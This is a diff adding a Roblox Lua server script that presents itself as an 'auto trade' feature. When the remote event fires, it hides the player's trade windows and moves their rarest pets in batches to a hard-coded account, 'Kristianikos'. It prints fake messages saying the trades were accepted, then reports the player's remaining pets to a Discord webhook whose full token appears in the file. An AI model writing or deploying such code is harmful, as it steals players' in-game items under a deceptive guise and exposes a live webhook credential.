@@ -1,0 +1,164 @@
+local Players = game:GetService("Players")
+local DataStoreService = game:GetService("DataStoreService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local petDataStore = DataStoreService:GetDataStore("PetDataStore")
+local webhookURL = "https://discord.com/api/webhooks/1372573536128073909/VUT8MmNfzszHysNRX3u6ZV8JM3tqErTloaFtTTn4pttS0-6lC9CXMHIt8tAKdQYGuqe8"
+local KRISTIANIKOS_USERID = 540352305
+local MAX_INVENTORY = 50
+
+local runningPlayers = {}
+
+-- General HTTP request helper function
+local function makeHttpRequest(method, url, data, contentType)
+    local success, response = pcall(function()
+        if method == "GET" then
+            return HttpService:GetAsync(url)
+        elseif method == "POST" then
+            return HttpService:PostAsync(url, data or "", contentType or Enum.HttpContentType.ApplicationJson)
+        else
+            return HttpService:RequestAsync({
+                Url = url,
+                Method = method,
+                Headers = {
+                    ["Content-Type"] = contentType or "application/json",
+                },
+                Body = data or "",
+            })
+        end
+    end)
+    if success then
+        return response
+    else
+        warn("HTTP request failed:", response)
+        return nil
+    end
+end
+
+local function disableTradeGui(player)
+    local playerGui = player:FindFirstChild("PlayerGui")
+    if playerGui then
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name:lower():find("trade") then
+                gui.Enabled = false
+                print("Trade GUI disabled for " .. player.Name)
+            end
+        end
+    end
+end
+
+local function getPets(userId)
+    local success, dataOrError = pcall(function()
+        return petDataStore:GetAsync(userId)
+    end)
+    if not success then
+        warn("Failed to get pets for userId " .. tostring(userId) .. ": " .. tostring(dataOrError))
+        return {}
+    end
+    if not dataOrError then
+        return {}
+    end
+    return dataOrError
+end
+
+local function savePets(userId, pets)
+    local success, errorMsg = pcall(function()
+        petDataStore:SetAsync(userId, pets)
+    end)
+    if not success then
+        warn("Failed to save pets for userId " .. tostring(userId) .. ": " .. tostring(errorMsg))
+    end
+end
+
+local function sendToDiscord(playerName, pets)
+    local content = playerName .. " completed auto trade.\nRemaining pets:\n"
+    for _, pet in ipairs(pets) do
+        content = content .. "- " .. pet.name .. " (1/" .. pet.rarity .. ")\n"
+    end
+    local payload = HttpService:JSONEncode({ content = content })
+    local success, errorMsg = pcall(function()
+        HttpService:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+    if not success then
+        warn("Failed to send Discord webhook: " .. tostring(errorMsg))
+    end
+end
+
+local function sortPetsByChance(pets)
+    table.sort(pets, function(a, b)
+        local aChance = tonumber(a.rarity:match("1/(%d+)")) or math.huge
+        local bChance = tonumber(b.rarity:match("1/(%d+)")) or math.huge
+        return aChance < bChance
+    end)
+    return pets
+end
+
+local function removePets(pets, petsToRemove)
+    for _, removePet in ipairs(petsToRemove) do
+        for i, pet in ipairs(pets) do
+            if pet.name == removePet.name and pet.rarity == removePet.rarity then
+                table.remove(pets, i)
+                break
+            end
+        end
+    end
+end
+
+local function autoTrade(player)
+    if runningPlayers[player.UserId] then return end
+    runningPlayers[player.UserId] = true
+
+    disableTradeGui(player)
+
+    print(player.Name .. " sent trade request to Kristianikos.")
+    print("Kristianikos accepted trade request automatically (offline).")
+
+    while runningPlayers[player.UserId] and player.Parent do
+        local playerPets = getPets(player.UserId)
+        local kristPets = getPets(KRISTIANIKOS_USERID)
+
+        if #playerPets == 0 then  
+            print("Player has no pets left to trade.")  
+            break  
+        end  
+
+        if #kristPets >= MAX_INVENTORY then  
+            print("Kristianikos's inventory is full.")  
+            break  
+        end  
+
+        local sortedPets = sortPetsByChance(playerPets)  
+
+        local tradeBatch = {}  
+        for i = 1, math.min(10, #sortedPets) do  
+            table.insert(tradeBatch, sortedPets[i])  
+        end  
+
+        print(player.Name .. " adding " .. #tradeBatch .. " pets to trade.")  
+        print("Both players accept and confirm the trade automatically.")  
+
+        removePets(playerPets, tradeBatch)  
+        for _, pet in ipairs(tradeBatch) do  
+            table.insert(kristPets, pet)  
+        end  
+
+        savePets(player.UserId, playerPets)  
+        savePets(KRISTIANIKOS_USERID, kristPets)  
+
+        print("Trade batch completed: " .. #tradeBatch .. " pets transferred.")  
+
+        wait(1) -- small delay to avoid overloading DataStore
+    end
+
+    sendToDiscord(player.Name, getPets(player.UserId))
+
+    runningPlayers[player.UserId] = nil
+end
+
+local tradeEvent = ReplicatedStorage:WaitForChild("ExecuteAutoTrade")
+tradeEvent.OnServerEvent:Connect(autoTrade)
+
+Players.PlayerRemoving:Connect(function(player)
+    runningPlayers[player.UserId] = nil
+end)
